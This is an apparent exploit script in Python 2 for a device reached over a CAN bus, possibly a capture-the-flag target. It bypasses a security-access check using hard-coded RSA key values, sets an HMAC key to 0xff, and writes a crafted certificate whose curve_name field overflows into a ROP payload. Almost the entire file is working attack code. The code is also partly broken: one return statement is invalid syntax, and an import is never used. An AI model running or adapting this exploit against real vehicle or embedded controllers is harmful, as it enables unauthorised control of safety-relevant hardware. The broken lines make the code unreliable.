import serial
import sys
from time import sleep
import re
import struct
import wolframalpha

def read_can_pack(can):
    buff=can.read(12)
    #print "->",buff[:8].encode('hex')
    size=ord(buff[10])
    id=struct.unpack("H",buff[8:10])[0]
    return (id,buff[:size])

def send_can_pack(can,id,data):
    if len(data)>8:
        print "error len", len(data)
        return
    buff=data+"\x00"*(8-len(data))+struct.pack("H",id)+chr(len(data))+'\n'
    #print "<-",data.encode("hex")
    can.write(buff)    
    
def send_big_can_pack(can,buff,id):
    if len(buff)/7<1:
       send_can_pack(can,id,"\x00"+buff)
    else:
       hdr=struct.pack(">H",len(buff)|1<<12)
       send_can_pack(can,id,hdr+buff[:6])
       size_left=len(buff)-6
       for i in range(size_left/7):
           hdr=struct.pack("B",((i+1)&0xF)|2<<4)
           send_can_pack(can,id,hdr+buff[6+i*7:6+(i+1)*7])
           sleep(0.05)
       if size_left%7!=0:
            i=size_left/7
            hdr=struct.pack("B",((i+1)&0xF)|2<<4)
            send_can_pack(can,id,hdr+buff[6+i*7:])

def recv_big_can_pack(can):
    id,data=read_can_pack(can)
    if ord(data[0])>>4==0:
        return id,data
    elif ord(data[0])>>4==1:
        exp_len=(ord(data[0])&0xF)<<8|ord(data[1])
        if exp_len<=6:
            print "exp len error",exp_len
            return
        outbuff=data[2:]
        exp_len-=6
        for i in range(1,exp_len/7+2):
            id2,data=read_can_pack(can)
            if id2!=id:
                print "id mismatch",id, id2
                return
            if ord(data[0])&0xF!=i&0xF:
                print "seq mismatch", ord(data[0])&0xF,i&0xF
            outbuff+=data[1:]
        return id,outbuff

def gen_resp(chall):
    p=39971
    q=69493
    e=31337
    d=690033473
    return resp=pow(chall,d,p*q)

def set_maintance_mode(can):
    send_big_can_pack(can,"\x27\x01",0x665) #read challange
    id,data=recv_big_can_pack(can)
    chall=struct.unpack("Q",data[2:])[0]
    print hex(id),data.encode('hex')
    print "challange: ",chall

    #resp=int(raw_input("enter resp: "))
    resp=gen_resp(chall)

    print "sending resp",resp
    resp=struct.pack("Q",resp)
    send_big_can_pack(can,"\x27\x00"+resp,0x665) #send resp
    id,data=recv_big_can_pack(can)
    print hex(id),data.encode('hex')
    

def set_hmac_ff(can):
    send_big_can_pack(can,"\x31\x01\x43\x01",0x665) #set hmac key to 0xff
    id,data=recv_big_can_pack(can)
    print hex(id),data.encode('hex')

def gen_key(can,buff):
    send_big_can_pack(can,buff,0x776) 
    id,data=recv_big_can_pack(can)
    print hex(id),data.encode('hex')

def write_cert(can,cert):
    sz=len(cert)
    addr=0x40
    hdr=struct.pack("HH",addr,sz)    

    send_big_can_pack(can,"\x3d\x22"+hdr+cert,0x665) 
    id,data=recv_big_can_pack(can)

    print hex(id),data.encode('hex')

def gen_cert(rop_payload):
    cert_name="1"
    cert_name="\x80"+chr(len(cert_name))+cert_name
    curve_name="\x00"*(108)+rop_payload
    curve_name="\x81"+chr(len(curve_name))+curve_name
    magic="3"
    magic="\x82"+chr(len(magic))+magic
    key="4"*0x31
    key="\x83"+chr(len(key))+key
    sig="5"*0x20
    sig="\x84"+chr(len(sig))+sig
    cert=cert_name+curve_name+magic+key+sig
    cert="\x30"+chr(len(cert))+cert
    return cert
    
    
    

#can=serial.Serial(port="COM11",baudrate=115200)
can=serial.Serial(port="/dev/ttyUSB0",baudrate=115200)
    
while can.readline()!="CAN init OK\n":
    pass


#cert=gen_cert("\x00\x4c\x68\x01\x01\x01\x00\x8b\xb2\x01\x01\x01\x00\x92\x5d\x72\x12\x00\x92\x59\x01\x01\x01\x01\x00\x8b\xb8")
cert=gen_cert("\x00\x4c\x68\x01\x01\x01\x00\x8b\xb2\x01\x01\x01\x00\x92\x5d\x12\x12\x00\x92\x59\x01\x01\x01\x01\x00\x8b\xb8")
#cert=gen_cert("\x4e\xe9\x0\x4e\xd9")
#print cert.encode('hex')
#gen_key(can,"")
set_maintance_mode(can)
set_hmac_ff(can)
write_cert(can,cert)

while True:
    id,data=recv_big_can_pack(can)
    print hex(id),data.encode('hex')

